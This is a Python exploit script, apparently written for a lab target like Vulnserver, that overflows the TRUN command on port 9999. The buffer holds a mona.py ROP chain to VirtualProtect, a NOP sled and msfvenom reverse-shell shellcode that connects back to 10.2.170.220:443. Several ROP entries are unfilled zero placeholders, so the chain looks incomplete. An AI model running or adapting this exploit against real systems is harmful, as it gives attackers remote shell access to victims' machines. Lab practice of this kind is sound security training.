#!/usr/bin/env python
import socket
import struct
ip = "10.2.170.228"
port = 9999
prefix = b"TRUN ."

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	  #[---INFO:gadgets_to_set_esi:---]
	  0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
	  0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
	  #[---INFO:gadgets_to_set_ebp:---]
	  0x625011e6,  # POP EBP # RETN [essfunc.dll] 
	  0x625011bb,  # & jmp esp [essfunc.dll]
	  #[---INFO:gadgets_to_set_ebx:---]
	  0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
	  #[---INFO:gadgets_to_set_edx:---]
	  0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
	  #[---INFO:gadgets_to_set_ecx:---]
	  0x6250120c,  # POP ECX # RETN [essfunc.dll] 
	  0x62504221,  # &Writable location [essfunc.dll]
	  #[---INFO:gadgets_to_set_edi:---]
	  0x6250172b,  # POP EDI # POP EBP # RETN [essfunc.dll] 
	  0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
	  0x41414141,  # Filler (compensate)
	  #[---INFO:gadgets_to_set_eax:---]
	  0x625011b4,  # POP EAX # RETN [essfunc.dll] 
	  0x90909090,  # nop
	  #[---INFO:pushad:---]
	  0x00000000,  # [-] Unable to find pushad gadget
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.170.220 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
shellcode = (b"\xd9\xc2\xd9\x74\x24\xf4\xbb\x85\xd9\x43\x32\x5a\x31\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x5a\x13\x03\xdf\xca\xa1\xc7\x23\x04\xa7"
b"\x28\xdb\xd5\xc8\xa1\x3e\xe4\xc8\xd6\x4b\x57\xf9\x9d\x19\x54"
b"\x72\xf3\x89\xef\xf6\xdc\xbe\x58\xbc\x3a\xf1\x59\xed\x7f\x90"
b"\xd9\xec\x53\x72\xe3\x3e\xa6\x73\x24\x22\x4b\x21\xfd\x28\xfe"
b"\xd5\x8a\x65\xc3\x5e\xc0\x68\x43\x83\x91\x8b\x62\x12\xa9\xd5"
b"\xa4\x95\x7e\x6e\xed\x8d\x63\x4b\xa7\x26\x57\x27\x36\xee\xa9"
b"\xc8\x95\xcf\x05\x3b\xe7\x08\xa1\xa4\x92\x60\xd1\x59\xa5\xb7"
b"\xab\x85\x20\x23\x0b\x4d\x92\x8f\xad\x82\x45\x44\xa1\x6f\x01"
b"\x02\xa6\x6e\xc6\x39\xd2\xfb\xe9\xed\x52\xbf\xcd\x29\x3e\x1b"
b"\x6f\x68\x9a\xca\x90\x6a\x45\xb2\x34\xe1\x68\xa7\x44\xa8\xe4"
b"\x04\x65\x52\xf5\x02\xfe\x21\xc7\x8d\x54\xad\x6b\x45\x73\x2a"
b"\x8b\x7c\xc3\xa4\x72\x7f\x34\xed\xb0\x2b\x64\x85\x11\x54\xef"
b"\x55\x9d\x81\xa0\x05\x31\x7a\x01\xf5\xf1\x2a\xe9\x1f\xfe\x15"
b"\x09\x20\xd4\x3d\xa0\xdb\xbf\x4b\x37\x49\xe3\x24\x35\x8d\x1d"
b"\x0e\xb0\x6b\x77\x60\x95\x24\xe0\x19\xbc\xbe\x91\xe6\x6a\xbb"
b"\x92\x6d\x99\x3c\x5c\x86\xd4\x2e\x09\x66\xa3\x0c\x9c\x79\x19"
b"\x38\x42\xeb\xc6\xb8\x0d\x10\x51\xef\x5a\xe6\xa8\x65\x77\x51"
b"\x03\x9b\x8a\x07\x6c\x1f\x51\xf4\x73\x9e\x14\x40\x50\xb0\xe0"
b"\x49\xdc\xe4\xbc\x1f\x8a\x52\x7b\xf6\x7c\x0c\xd5\xa5\xd6\xd8"
b"\xa0\x85\xe8\x9e\xac\xc3\x9e\x7e\x1c\xba\xe6\x81\x91\x2a\xef"
b"\xfa\xcf\xca\x10\xd1\x4b\xea\xf2\xf3\xa1\x83\xaa\x96\x0b\xce"
b"\x4c\x4d\x4f\xf7\xce\x67\x30\x0c\xce\x02\x35\x48\x48\xff\x47"
b"\xc1\x3d\xff\xf4\xe2\x17")

offset = 2006
junk = b"A" * offset
nop_sled = b"\x90"*32
payload = shellcode
filler = b"C" * (3500 - len(junk) - len(rop_chain) - len(nop_sled) - len(payload))

buffer = prefix + junk + rop_chain + nop_sled + payload + filler

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")
